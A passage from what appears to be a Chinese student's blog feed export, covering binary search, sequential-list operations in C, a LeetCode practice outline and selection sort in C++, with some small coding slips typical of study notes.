非递归方法的二分查找方法</span></span><br><span class="line"><span class="comment">    * @params:s[] 存储数字的数组；</span></span><br><span class="line"><span class="comment">    * @params:n 数列中元素的个数</span></span><br><span class="line"><span class="comment">    * @params:x 指定查找的数</span></span><br><span class="line"><span class="comment">    * @return: 成功返回查找到的位置，否则返回-1</span></span><br><span class="line"><span class="comment">    * @see:</span></span><br><span class="line"><span class="comment">    * @note:</span></span><br><span class="line"><span class="comment">    * @calls: 被本函数调用的函数清单</span></span><br><span class="line"><span class="comment">    * @calledBy: 调用本函数的函数清单</span></span><br><span class="line"><span class="comment">    * @TableAccessed: 被访问的表（此项仅对于牵扯到数据库操作的程序）</span></span><br><span class="line"><span class="comment">    * @TableUpdated:  被修改的表（此项仅对于牵扯到数据库操作的程序）</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> high = n - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(low &lt; high)&#123;</span><br><span class="line">        <span class="keyword">int</span> middle = (low + high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(x == s[middle])&#123;</span><br><span class="line">            <span class="keyword">return</span> middle;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (x &lt; s[middle])</span><br><span class="line">        &#123;</span><br><span class="line">            high = middle - <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            low = middle + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">recurionBS</span><span class="params">(<span class="keyword">int</span> s[], <span class="keyword">int</span> x, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * @ brief: 非递归的二分查找方法 </span></span><br><span class="line"><span class="comment">    * @ return: 失败返回-1 </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span>(low &gt; high)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> middle = (low + high) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(x == s[middle])&#123;</span><br><span class="line">        <span class="keyword">return</span> middle;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(x &lt; s[middle]) &#123;</span><br><span class="line">        <span class="keyword">return</span> recurionBS(s, x, low, middle <span class="number">-1</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> recurionBS(s, x, middle + <span class="number">1</span>, high);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;请输入数列中元素的个数n&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;请依次输入数列的元素&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;s[i];</span><br><span class="line">        &#125;</span><br><span class="line">        sort(s, s + n);</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;排列后的数组为：&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;s[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;请输入要查找的元素：&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;x;</span><br><span class="line">        <span class="comment">// i = BinarySearch(n, s, x);</span></span><br><span class="line">        i = recurionBS(s, x, <span class="number">0</span>, n<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;该数列中没有符合要求的元素&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;要查找的元素在第&quot;</span>&lt;&lt;i + <span class="number">1</span>&lt;&lt;<span class="string">&quot;位&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2019/10/14/%E5%88%86%E6%B2%BB%E7%AE%97%E6%B3%95/1570960394633.png" alt="1570960394633"></p>]]></content>
      
      
      <categories>
          
          <category> 分治算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分治算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线性表</title>
      <link href="/2019/10/13/%E7%BA%BF%E6%80%A7%E8%A1%A8/"/>
      <url>/2019/10/13/%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p><code>realloc</code>函数：</p><ul><li><p>作用：重新分配内存空间，原型为<code>void* realloc(void*ptr, size_t size)</code>，其中<code>ptr</code>为重新分配的内存空间指针，<code>size</code>为新的内存空间的大小。若<code>ptr</code>为<code>NULL</code>，那么效果和<code>malloc</code>（）相同，即分配size字节的内存空间；若<code>size</code>值为0，那么<code>ptr</code>指向的 内存空间就会被释放，但是由于没有开辟新的内存空间，所以会返回空指针；类似于调用 <code>free</code>()</p></li><li><p>头文件：<code>#include&lt;stdlib.h&gt;</code></p><a id="more"></a></li></ul><h1 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h1><h2 id="顺序表的初始化"><a href="#顺序表的初始化" class="headerlink" title="顺序表的初始化"></a>顺序表的初始化</h2><p>使用顺序表存储数据之前，除了要申请足够大小的物理空间之外，为了方便后期使用表中的数据，顺序表还需要实时记录以下 2 项数据：</p><ol><li>顺序表申请的存储容量；</li><li>顺序表的长度，也就是表中存储数据元素的个数；</li></ol><blockquote><p>提示：正常状态下，顺序表申请的存储容量要大于顺序表的长度。</p></blockquote><p>因此，我们需要自定义顺序表，C 语言实现代码如下：<br>注意，head 是我们声明的一个未初始化的动态数组，不要只把它看做是普通的指针。</p><p>接下来开始学习顺序表的初始化，也就是初步建立一个顺序表。建立顺序表需要做如下工作：</p><ul><li>给 head 动态数据申请足够大小的物理空间；</li><li>给 size 和 length 赋初值</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Size 10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Table</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> *head;   <span class="comment">//声明了一个名为head的长度不确定的数组，也叫“动态数组”</span></span><br><span class="line">    <span class="keyword">int</span> length;   <span class="comment">//记录当前顺序表的长度</span></span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>;     <span class="comment">//记录顺序表分配的存储容量</span></span><br><span class="line">&#125;table;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">table <span class="title">initTable</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * @brief: 顺序表初始化</span></span><br><span class="line"><span class="comment">    * @return: 返回顺序表t</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    table t;</span><br><span class="line">    t.head = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(Size*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="keyword">if</span>(!t.head)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;初始化失败\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    t.length = <span class="number">0</span>;</span><br><span class="line">    t.<span class="built_in">size</span> = Size;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="顺序表插入元素"><a href="#顺序表插入元素" class="headerlink" title="顺序表插入元素"></a>顺序表插入元素</h2><p>向已有顺序表中插入数据元素，根据插入位置的不同，可分为以下<code> 3</code> 种情况：</p><ol><li>插入到顺序表的表头；</li><li>在表的中间位置插入元素；</li><li>尾随顺序表中已有元素，作为顺序表中的最后一个元素；</li></ol><p>虽然数据元素插入顺序表中的位置有所不同，但是都使用的是同一种方式去解决，即：通过<strong>遍历</strong>，找到数据元素要插入的位置，然后做如下<strong>两步工作</strong>：</p><ul><li>将要插入位置元素以及后续的元素整体向后移动一个位置；</li><li>将元素放到腾出来的位置上；</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">table <span class="title">addTable</span><span class="params">(table t, <span class="keyword">int</span> elem, <span class="keyword">int</span> add)</span></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * @brief: 插入元素到指定的位置</span></span><br><span class="line"><span class="comment">    * @params: elem 插入的元素</span></span><br><span class="line"><span class="comment">    * @params: add 插入到顺序表的位置</span></span><br><span class="line"><span class="comment">    * @return: table t</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断插入本身是否存在问题（如果插入元素位置比整张表的长度+1还大（如果相等，是尾随的情况），或者插入的位置本身不存在，程序作为提示并自动退出）</span></span><br><span class="line">    <span class="keyword">if</span>(add &gt; t.length + <span class="number">1</span> || add &lt; <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;插入的位置有问题\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入时，判断顺序表是否有多余的存储空间提供给插入的元素。若没有，则申请空间</span></span><br><span class="line">    <span class="keyword">if</span>(t.length == t.<span class="built_in">size</span>)&#123;</span><br><span class="line">        t.head = (<span class="keyword">int</span> *)<span class="built_in">realloc</span>(t.head, (t.<span class="built_in">size</span> + <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        <span class="keyword">if</span>(!t.head)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;存储空间分配失败\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> t;</span><br><span class="line">        &#125;</span><br><span class="line">        t.<span class="built_in">size</span> += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入操作，将从插入位置开始的后续元素，逐个后移</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = t.length - <span class="number">1</span>; i &gt;= add - <span class="number">1</span>; i--)&#123;</span><br><span class="line">        t.head[i+<span class="number">1</span>] = t.head[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后移完成后，直接将所插入的元素添加到顺序表相应的位置</span></span><br><span class="line">    t.head[add<span class="number">-1</span>] = elem;</span><br><span class="line">    t.length += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，<strong>动态数组</strong>额外申请更多物理空间使用的是<code> realloc 函数</code>。并且，在实现后续元素整体后移的过程，目标位置其实是有数据的，只是下一步新插入元素时会把旧元素<strong>直接覆盖。</strong></p><h2 id="顺序表删除元素"><a href="#顺序表删除元素" class="headerlink" title="顺序表删除元素"></a>顺序表删除元素</h2><p>从顺序表中删除指定元素，实现起来非常简单，只需找到目标元素，并将其后续所有元素整体前移 1 个位置即可。</p><blockquote><p>后续元素整体前移一个位置，会直接将目标元素删除，可间接实现删除元素的目的。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">table <span class="title">delTable</span><span class="params">(table t, <span class="keyword">int</span> add)</span></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * @brief: 顺序表元素删除</span></span><br><span class="line"><span class="comment">    * @params: add 被删除元素的顺序表位置</span></span><br><span class="line"><span class="comment">    * @return: table t</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span>(add &gt; t.length || add &lt; <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;被删除元素的位置有误\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = add; i &lt; t.length; i++)&#123;</span><br><span class="line">        t.head[i<span class="number">-1</span>] = t.head[i];</span><br><span class="line">    &#125;</span><br><span class="line">    t.length--;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="顺序表查找元素"><a href="#顺序表查找元素" class="headerlink" title="顺序表查找元素"></a>顺序表查找元素</h2><p>  顺序表中查找目标元素，可以使用多种查找算法实现，比如说<a href="http://data.biancheng.net/view/55.html">二分查找</a>算法、插值查找算法等。</p><p>这里，我们选择<a href="http://data.biancheng.net/view/54.html">顺序查找</a>算法，具体实现代码为：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">selectTable</span><span class="params">(table t, <span class="keyword">int</span> elem)</span></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * @prief: 元素查找</span></span><br><span class="line"><span class="comment">    * @params: elem 带查找的元素 </span></span><br><span class="line"><span class="comment">    * @return: 查找成功返回被查找元素的位置，否则-1</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t.length; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(t.head[i] == elem)&#123;</span><br><span class="line">            <span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1、张三：    buffer:    0x0029f3ec     list:    0x0040a7a0  = list.id</p><p>赵六：0x001df7cc   欧阳粉墙</p><p>李四：0029f3ec(aStu.id)</p><p>王五：0x0029f433(result)</p><h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线性表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>力扣算法练习</title>
      <link href="/2019/10/10/%E5%8A%9B%E6%89%A3%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0/"/>
      <url>/2019/10/10/%E5%8A%9B%E6%89%A3%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>想通过将近一年的学习时间刷一下力扣上的算法题目来提高个人的算法和逻辑思维能力</p><a id="more"></a><h1 id="1-十大经典排序算法"><a href="#1-十大经典排序算法" class="headerlink" title="1 十大经典排序算法"></a>1 十大经典排序算法</h1><h2 id="内部排序算法"><a href="#内部排序算法" class="headerlink" title="内部排序算法"></a>内部排序算法</h2><p>顾名思义是书籍记录在内存中进行排序</p><h3 id="1-插入排序"><a href="#1-插入排序" class="headerlink" title="1 插入排序"></a>1 插入排序</h3><table><thead><tr><th>排序算法</th><th>平均时间复杂度</th><th>最好情况</th><th>最坏情况</th><th>空间复杂度</th><th>排序方式</th><th>稳定性</th></tr></thead><tbody><tr><td>冒泡排序</td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p><strong>算法步骤</strong></p><ul><li>比较相邻的元素。如果第一个比第二个大，就交换他们两个。</li><li>对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。</li><li>针对所有的元素重复以上的步骤，除了最后一个。</li><li>持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class Solution &#123;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * @param a: An integer</span><br><span class="line">     * @param b: An integer</span><br><span class="line">     * @return: The sum of a and b </span><br><span class="line">     *&#x2F;</span><br><span class="line">    public int aplusb(int a, int b) &#123;</span><br><span class="line">        &#x2F;&#x2F; write your code here</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-希尔排序"><a href="#2-希尔排序" class="headerlink" title="2 希尔排序"></a>2 希尔排序</h3><h3 id="3-选择排序"><a href="#3-选择排序" class="headerlink" title="3 选择排序"></a>3 选择排序</h3><h3 id="4-冒泡排序"><a href="#4-冒泡排序" class="headerlink" title="4 冒泡排序"></a>4 冒泡排序</h3><h3 id="5-归并排序"><a href="#5-归并排序" class="headerlink" title="5 归并排序"></a>5 归并排序</h3><h3 id="6-快速排序"><a href="#6-快速排序" class="headerlink" title="6 快速排序"></a>6 快速排序</h3><h3 id="7-堆排序"><a href="#7-堆排序" class="headerlink" title="7 堆排序"></a>7 堆排序</h3><h3 id="8-基数排序"><a href="#8-基数排序" class="headerlink" title="8 基数排序"></a>8 基数排序</h3><h1 id="2-力扣题库刷题"><a href="#2-力扣题库刷题" class="headerlink" title="2 力扣题库刷题"></a>2 力扣题库刷题</h1><h2 id="1-两数之和——A-B-Problem"><a href="#1-两数之和——A-B-Problem" class="headerlink" title="1 两数之和——A + B Problem"></a>1 两数之和——A + B Problem</h2>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全学习</title>
      <link href="/2019/10/02/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/10/02/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>哈哈</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>爬虫</title>
      <link href="/2019/01/01/%E7%88%AC%E8%99%AB/"/>
      <url>/2019/01/01/%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<p>爬虫是一件非常有趣的事情的</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构大综合1</title>
      <link href="/2018/05/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E7%BB%BC%E5%90%881/"/>
      <url>/2018/05/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E7%BB%BC%E5%90%881/</url>
      
        <content type="html"><![CDATA[<h1 id="排序基础"><a href="#排序基础" class="headerlink" title=" 排序基础"></a><center> 排序基础</center></h1><a id="more"></a><blockquote><p> 为什么要学习O(n^2)的排序算法？</p></blockquote><p><strong>①</strong>基础</p><p><strong>②</strong>编码简单，易于实现，是一些简单场景的首选</p><p><strong>③</strong>在一些特殊情况下，简单的排序算法更有效</p><p><strong>④</strong>简单的排序算法思想衍生出更复杂的排序算法</p><p><strong>⑤</strong>作为子过程，改进更复杂的排序算法 </p><h2 id="选择排序法"><a href="#选择排序法" class="headerlink" title="选择排序法"></a>选择排序法</h2><h3 id="算法思想"><a href="#算法思想" class="headerlink" title="算法思想"></a>算法思想</h3><blockquote><p>第一趟从n个元素的数据序列中选出关键字最小/大的元素并放在最前/后位置，下一趟从n-1个元素中选出最小/大的元素并放在最前/后位置。以此类推，经过n-1趟完成排序。是不稳定排序 算法</p><br><p>选择排序的思想其实和冒泡排序有点类似，都是在一次排序后把最小的元素放到最前面，或者将最大值放在最后面。但是过程不同，冒泡排序是通过<code>相邻的比较和交换</code>。而选择排序是通过对<code>整体的选择</code>，每一趟<code>从前往后</code>查找出<code>无序区</code>最小值，将最小值交换至无序区最前面的位置。 </p></blockquote><h3 id="实现逻辑"><a href="#实现逻辑" class="headerlink" title="实现逻辑"></a>实现逻辑</h3><p>第一轮从下标为 1 到下标为 n-1 的元素中选取最小值，若小于第一个数，则交换第二轮从下标为 2 到下标为 n-1 的元素中选取最小值，若小于第二个数，则交换依次类推下去…… </p><h3 id="动态演示"><a href="#动态演示" class="headerlink" title="动态演示"></a>动态演示</h3><center>![](数据结构大综合1/选择排序.gif)</center><p>选择排序演示</p><p>注：红色表示当前最小值，黄色表示已排序序列，绿色表示当前位置。</p><p>具体的我们以一组无序数列｛20，40，30，10，60，50｝为例分解说明，如下图所示：</p><center><p><img src="/2018/05/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E7%BB%BC%E5%90%881/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F2.jpg"></p></center><h3 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><blockquote><p>平均时间复杂度：O(N^2) </p><p>最佳时间复杂度：O(N^2) </p><p>最差时间复杂度：O(N^2)</p><p>空间复杂度：O(1)</p><p>排序方式：In-place</p><p>稳定性：不稳定</p></blockquote><p>选择排序的<code>交换</code>操作介于和(n-1)次之间。选择排序的<code>比较</code>操作为n(n-1)/2次之间。选择排序的赋值操作介于0和3(n-1)次之间。</p><p><code>比较次数</code>O(n^2)，比较次数与关键字的初始状态无关;</p><p><code>总的比较次数</code>N = (n-1) + (n-2) +…+ 1 = n x (n-1)/2;</p><p><code>交换次数</code>O(n)，<code>最好</code>情况是，已经有序，交换0次；<code>最坏</code>情况是，逆序，交换n-1次。</p><h3 id="代码演示"><a href="#代码演示" class="headerlink" title="代码演示"></a>代码演示</h3><blockquote><p><strong>第一步：main函数</strong></p></blockquote><p><code>main.cpp</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;algorithm&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">void selectionSort(int arr[], int n)&#123;</span><br><span class="line"></span><br><span class="line">    for(int i &#x3D; 0 ; i &lt; n ; i ++)&#123;</span><br><span class="line">        &#x2F;&#x2F; 寻找[i, n)区间里的最小值</span><br><span class="line">        int minIndex &#x3D; i;</span><br><span class="line">        for( int j &#x3D; i + 1 ; j &lt; n ; j ++ )</span><br><span class="line">            if( arr[j] &lt; arr[minIndex] )</span><br><span class="line">                minIndex &#x3D; j;</span><br><span class="line"></span><br><span class="line">        swap( arr[i] , arr[minIndex] );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">    int a[10] &#x3D; &#123;10,9,8,7,6,5,4,3,2,1&#125;;</span><br><span class="line">    selectionSort(a,10);</span><br><span class="line">    for( int i &#x3D; 0 ; i &lt; 10 ; i ++ )</span><br><span class="line">        cout&lt;&lt;a[i]&lt;&lt;&quot; &quot;;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于实际使用过程中，数据类型不仅是整型，还可以是浮点数、字符串等等，所以我们需要写一个模板函数（也称为泛型）</p><blockquote><p><strong>第二步：模板函数</strong></p></blockquote><p><code>Student.h</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#pragma once</span><br><span class="line"></span><br><span class="line">#ifndef INC_02_SELECTION_SORT_USING_TEMPLATE_STUDENT_H</span><br><span class="line">#define INC_02_SELECTION_SORT_USING_TEMPLATE_STUDENT_H</span><br><span class="line"></span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">struct Student &#123;</span><br><span class="line"></span><br><span class="line">    string name;</span><br><span class="line">    int score;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;重载运算符</span><br><span class="line">    bool operator&lt;(const Student&amp; otherStudent) &#123;</span><br><span class="line">        return score !&#x3D; otherStudent.score ?</span><br><span class="line">            score &gt; otherStudent.score : name &lt; otherStudent.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    friend ostream&amp; operator&lt;&lt;(ostream &amp;os, const Student &amp;student) &#123;</span><br><span class="line"></span><br><span class="line">        os &lt;&lt; &quot;Student: &quot; &lt;&lt; student.name &lt;&lt; &quot; &quot; &lt;&lt; student.score &lt;&lt; endl;</span><br><span class="line">        return os;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">#endif 